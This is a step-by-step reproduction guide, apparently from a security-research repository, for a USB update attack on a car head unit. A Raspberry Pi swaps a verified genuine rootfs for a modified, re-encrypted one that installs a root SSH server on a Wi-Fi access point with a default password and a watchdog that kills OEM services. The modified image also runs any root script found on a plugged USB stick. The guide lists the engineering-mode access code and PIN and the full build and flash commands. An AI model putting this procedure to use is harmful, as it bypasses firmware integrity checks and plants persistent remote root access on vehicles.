# 07 — Owner Tools image: build & flash (reproduction)

Produce and flash the v2 image: a genuine 260128 rootfs plus a payload that adds an **Owner
Tools** entry to Full Engineering Mode, brings the **built-in Wi-Fi (wlan0) up as an AP** with a
bundled **dropbear** SSH server, and runs a **USB dev-loader** for post-install iteration.
Delivery is the verify-then-install USB TOCTOU swap (base rig: `README.md`, `docs/01`–`04`,
`pizero/DEPLOY.md`).

External inputs (not in the repo): the **genuine firmware package** (contains
`HU/images/mango-rootfs.tar.gz`, the 879,126,179-byte TE2 envelope) and the **TE2 content key**
(32 hex, AES-128) in `pizero/key.local` or `$TE2_CONTENT_KEY`.

---

## 1. Constants

```
TE2 content key        pizero/key.local  (or $TE2_CONTENT_KEY)
Envelope basename      mango-rootfs.tar.gz        (IV = f(basename, body_size))
Plaintext ceiling      879,109,759 bytes          (genuine tar.gz body; evil <= this, then padded to exactly this)
Envelope size          879,126,179 bytes          (body + 0x4024 trailer)
Rootfs extent in img   off=5,505,024  len=879,126,179   (emitted by 02_build_usb_image.sh)
Switch                 switch_after_pass=2        (genuine on pass 1, evil from pass 2)
Wi-Fi SSID / PSK       IONIQ5-OWNER / ChangeMe-OwnerPSK
AP address             10.42.0.1/24
SSH                    ssh -i <owner_key> -o IdentitiesOnly=yes root@10.42.0.1
```

---

## 2. Repo layout (reproduction-relevant)

```
pizero/
  gen5w_decrypt.py            TE2 envelope parse / decrypt / inspect
  te2_encrypt.py              re-wrap plaintext under a basename (sets the IV)
  build_v2.sh                 build the v2 evil envelope (decrypt→inject→gzip-9→pad→encrypt→verify)
  02_build_usb_image.sh       build baseline usb.img + regions.json (rootfs extent off/len)
  03_deploy_gadget.sh         nbdkit → nbd-client → configfs mass-storage → dwc2 UDC
  nbdkit_toctou.py            serves genuine on pass 1, evil from pass 2 over the extent
  99_teardown.sh              unwind the gadget
  arm.sh                      generate regions_<mode>.json + (re)deploy  [imei|foothold|menu|menu2]
  toctou-gadget.service       optional boot auto-arm
  payload/
    bin/dropbearmulti         static musl x86-64 dropbear (see §3)
    authorized_keys           owner SSH public key(s)
    v2/
      wifi-up.sh              AP + dropbear bring-up + watchdog
      owner-access.service    runs wifi-up.sh  (Type=simple, Restart=always)
      wpa_ap.conf             static AP config (fallback path)
      dev-loader.sh           run toctou_dev.sh off a plugged stick
      toctou-devloader.service runs dev-loader.sh
      OwnerTools.qml          on-HU Owner Tools page
      inject_fullmain.py      inject the Owner Tools button into AppEngineerMode_FullMain.qml
      toctou_dev.sh           benign read-only stick script (writes v2_hello.txt)
      toctou_dev_diag.sh      read-only diagnostic (listen :22, wlan0, wifi-up.log)
```

---

## 3. Build the static dropbear binary (`payload/bin/dropbearmulti`)

x86-64 static musl build (host needs `musl-gcc`, i.e. `musl-tools`):

```bash
git clone https://github.com/mkj/dropbear && cd dropbear
./configure CC=musl-gcc --disable-zlib --disable-syslog --disable-harden LDFLAGS=-static
make PROGRAMS="dropbear dbclient dropbearkey scp" MULTI=1 STATIC=1
# -> ./dropbearmulti (one static multi-call binary)
cp dropbearmulti /path/to/repo/pizero/payload/bin/dropbearmulti
file pizero/payload/bin/dropbearmulti    # ELF 64-bit LSB executable, x86-64, statically linked
```

The image symlinks `/usr/sbin/dropbear -> dropbearmulti` and starts it `-R -s -p 22`
(in-memory host keys, key-only, port 22).

---

## 4. Owner SSH key (`payload/authorized_keys`)

```bash
ssh-keygen -t ed25519 -f ~/.ssh/ioniq_owner -N ''
cp ~/.ssh/ioniq_owner.pub pizero/payload/authorized_keys     # one or more pubkeys, one per line
```
Baked to `/etc/dropbear/owner_authorized_keys`; `wifi-up.sh` merges it into
`/home/root/.ssh/authorized_keys`.

---

## 5. Payload installed by the image

| Source | Installed path | Content |
|---|---|---|
| `payload/bin/dropbearmulti` | `/usr/sbin/dropbearmulti` (+ `dropbear` symlink) | static SSH server |
| `payload/authorized_keys` | `/etc/dropbear/owner_authorized_keys` | owner pubkey(s) |
| `payload/v2/wifi-up.sh` | `/etc/owner/wifi-up.sh` | AP + dropbear bring-up; 10 s watchdog holds wlan0 as AP, re-asserts dropbear |
| `payload/v2/owner-access.service` | `/etc/systemd/system/` (+ `multi-user.target.wants/` symlink) | `Type=simple`, `Restart=always`, `ExecStart=/bin/sh /etc/owner/wifi-up.sh` |
| `payload/v2/wpa_ap.conf` | `/etc/wpa_supplicant/wpa_ap.conf` | static AP config |
| `payload/v2/dev-loader.sh` | `/etc/owner/dev-loader.sh` | polls `/media/usb/*/*/toctou_dev.sh`, runs it as root (md5-gated) |
| `payload/v2/toctou-devloader.service` | `/etc/systemd/system/` (+ wants symlink) | `Type=simple`, `ExecStart=/bin/sh /etc/owner/dev-loader.sh` |
| `payload/v2/OwnerTools.qml` | `/app/share/AppEngineerMode/qml/owner/OwnerTools.qml` | Owner Tools page |
| (patched in place) | `/app/share/AppEngineerMode/qml/AppEngineerMode_FullMain.qml` | Owner Tools `MMainButton` at `x:1000; y:380`, `onClickOrKeySelected: Global.popupQmlOpen("/app/share/AppEngineerMode/qml/owner/OwnerTools.qml","")` |

Service invariants (both units):
- No `SmackProcessLabel` — units inherit PID1's SMACK label.
- `ExecStart=/bin/sh /etc/owner/<script>` — stock `/bin/sh` reads the script.

`wifi-up.sh` behavior: load `cfg80211`/`bcmdhd`, `rfkill unblock`, start
`wpa_supplicant -i wlan0 -c /etc/wpa_supplicant/wpa_ap.conf`, add `10.42.0.1/24`, start
`dropbear -R -s -p 22`; then a 10 s loop that stops OEM wifi tether / kills
`supplicantmanager` + the station `wpa_supplicant`, and re-adds the address / re-starts dropbear
if missing. Logs to `/var/log/wifi-up.log`.

---

## 6. Build the v2 evil envelope

```bash
cd pizero
printf '%s\n' '<32-hex TE2 key>' > key.local && chmod 600 key.local     # or export TE2_CONTENT_KEY
./build_v2.sh menu  /path/to/HU/images/mango-rootfs.tar.gz  build/evil_rootfs_menu_v2.te2
```

Pipeline: decrypt genuine → `gunzip` → inject the Owner Tools button + stage the payload tree →
`tar --delete` the original FullMain, `tar --append` the additions (ustar, numeric-owner,
owner/group 0) → `gzip -9` → assert `<= 879,109,759` → `truncate` to exactly the ceiling →
`te2_encrypt` under basename `mango-rootfs.tar.gz` → round-trip `inspect`.

Pass criteria (build tail): `margin` ≥ 0, and `integrity_valid: true`.

(`gzip -9` is required: it recompresses the genuine tree small enough that the payload fits
under the ceiling.)

Verify the content baked in (decrypt under the HU-visible basename):
```bash
W=$(mktemp -d)
ln -sf "$(readlink -f build/evil_rootfs_menu_v2.te2)" "$W/mango-rootfs.tar.gz"
python3 gen5w_decrypt.py decrypt "$W/mango-rootfs.tar.gz" "$W/p.tar.gz" --force
tar -xzf "$W/p.tar.gz" -C "$W" \
  ./app/share/AppEngineerMode/qml/AppEngineerMode_FullMain.qml \
  ./app/share/AppEngineerMode/qml/owner/OwnerTools.qml \
  ./etc/owner/wifi-up.sh ./etc/owner/dev-loader.sh \
  ./etc/systemd/system/owner-access.service
grep -A1 fullmainButtonOwnerTools "$W"/app/share/AppEngineerMode/qml/AppEngineerMode_FullMain.qml
grep -E 'Type=|Restart=' "$W"/etc/systemd/system/owner-access.service
rm -rf "$W"
```

---

## 7. Build the baseline USB image + regions

```bash
cd pizero
# records the rootfs extent off/len from the genuine mango in the image; the evil envelope
# (built in §6) must already exist — any 879,126,179-byte v2 envelope works here.
sudo ./02_build_usb_image.sh /path/to/IONIQ5_package  build/evil_rootfs_menu_v2.te2
# -> build/usb.img, build/regions.json   (off=5505024 len=879126179 + evil path)
```

---

## 8. Deploy to the Pi and arm

```bash
# Pi provisioned per REPRODUCE.md §1 (dwc2 peripheral overlay, nbdkit, nbd-client, exfatprogs).
scp build/evil_rootfs_menu_v2.te2 sjl@<pi>:~/toctou-usb-update/pizero/build/
ssh sjl@<pi> 'cd ~/toctou-usb-update/pizero && md5sum build/evil_rootfs_menu_v2.te2'   # match local

ssh sjl@<pi> 'cd ~/toctou-usb-update/pizero && sudo ./arm.sh menu2'
# -> generates build/regions_menu_v2.json, tears down any live gadget, deploys, binds the UDC
```

Optional boot auto-arm (`pizero/toctou-gadget.service` drop-in):
```
[Service]
ExecStart=
ExecStart=/home/sjl/toctou-usb-update/pizero/03_deploy_gadget.sh \
  /home/sjl/toctou-usb-update/pizero/build/usb.img \
  /home/sjl/toctou-usb-update/pizero/build/regions_menu_v2.json
```

---

## 9. Flash and verify

1. Plug the Pi's USB **data** port into the head unit. (`tail -f /var/log/toctou.log` → `pass #1`,
   `pass #2`, `*** SWITCH at pass #2 ***`.)
2. Run the software update on the HU; let it install and reboot.
3. Enter Full Engineering Mode: Settings ▸ General ▸ System info ▸ Manual, tap left
   `3-2-8-9-6-5`, PIN `19480717`.

Checks:
- **Owner Tools** button at row 2, slot 5 (`x:1000; y:380`); tapping opens `OwnerTools.qml`.
- Join `IONIQ5-OWNER` / `ChangeMe-OwnerPSK`; `ssh -i <owner_key> -o IdentitiesOnly=yes root@10.42.0.1`.
- `/var/log/wifi-up.log` shows the bring-up + watchdog.

---

## 10. Post-install iteration (no reflash)

A plugged stick with a root-owned `toctou_dev.sh` at its filesystem root is run once per boot per
md5 by `dev-loader.sh` (scans `/media/usb/*/*/`). The HU mounts USB at
`/media/usb/<N>/<VOLID>/`.

```bash
cp pizero/payload/v2/toctou_dev.sh      '/media/<stick>/toctou_dev.sh'   # benign; writes v2_hello.txt
cp pizero/payload/v2/toctou_dev_diag.sh '/media/<stick>/toctou_dev.sh'   # read-only diagnostic
```
Output is written back to the stick (`v2_hello.txt` / `v2_diag.txt`) and `/var/log/`.

Run `99_teardown.sh` on the Pi to unwind the gadget.
